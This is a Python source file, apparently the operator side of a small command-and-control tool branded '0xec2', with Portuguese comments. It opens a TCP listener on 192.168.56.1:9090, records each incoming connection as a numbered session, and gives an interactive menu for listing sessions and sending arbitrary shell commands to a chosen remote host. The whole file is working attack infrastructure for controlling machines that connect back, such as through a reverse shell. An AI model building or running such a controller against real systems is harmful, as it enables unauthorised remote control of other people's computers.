import socket, time, os
from threading import Thread
from Session import Session
class Listener:

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.socket = None
        self.session_id_count = 0
        self.sessions = {}

    def create_socket(self):
        

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))
        self.socket.listen()
        print(f'Listening: {self.host}:{self.port}...')

    def accept_connection(self):
        conn, adrr = self.socket.accept()
        
        return conn, adrr
    
    @staticmethod # para não precisar do self, caso eu vá usar isso em outro arquivo em outra classe
    def send_data(conn, data):
        try:
            conn.sendall(data.encode())
        except Exception as e:
            print(f'Error sending data: {e}')
 
    @staticmethod # para não precisar do self, caso eu vá usar isso em outro arquivo em outra classe
    def receive_data(conn):
        try:
            
            data = conn.recv(4096)
            if not data:
                return None
            return data.decode(encoding = 'latin-1')
        except Exception as e:
            print(f'Error receiving data: {e}')
            return None
    
    def handle_client(self, conn: socket.socket, addr):

        self.session_id_count += 1
        new_session_id = self.session_id_count

        new_session = Session(new_session_id, conn, addr)

        self.sessions[new_session_id] = new_session

        th = Thread(target=new_session.start_listener, daemon=True).start()
        
    def my_listener_start(self):
        
        self.create_socket()
        while 1:
            conn, addr = self.accept_connection()
            
            self.handle_client(conn, addr)

    def menu(self):
        os.system('cls')
        banner = (r"""
              0xec2 MENU
              
              1 - choice session
              2 - list sessions
              e - exit
              c - clear
              
        """)
        print(banner)

        def choice_session():
            
            session_id = input('[session_id]> ')

            return session_id
       
        def list_session():
            for session_id in self.sessions.keys():
                print(f'id: {session_id} - host:{self.sessions[session_id].addr[0]}')

        while True:

            options = input('[0xe_principal]> ')
            if options.isdigit():
                if int(options) == 1:
                    choice_s = choice_session()
                    
                    if choice_s == 'back':
                        os.system('cls')
                        print(banner)
                        continue
                    elif choice_s.isdigit():
                        choice_s = int(choice_s)

                        while True:
                            cmd = input('cmd_principal: ')
                            if cmd == 'back':
                                os.system('cls')
                                print(banner)
                                break
                            self.sessions[choice_s].send_command(cmd)      

                elif int(options) == 2:
                    list_session()
            else:
                if options == 'c':
                    os.system('cls')
                    print(banner)

                   
if __name__ == "__main__":
    
    listener = Listener('192.168.56.1', 9090)
    th = Thread(target=listener.my_listener_start, daemon=True).start()
    time.sleep(0.3)

    listener.menu()

 

    





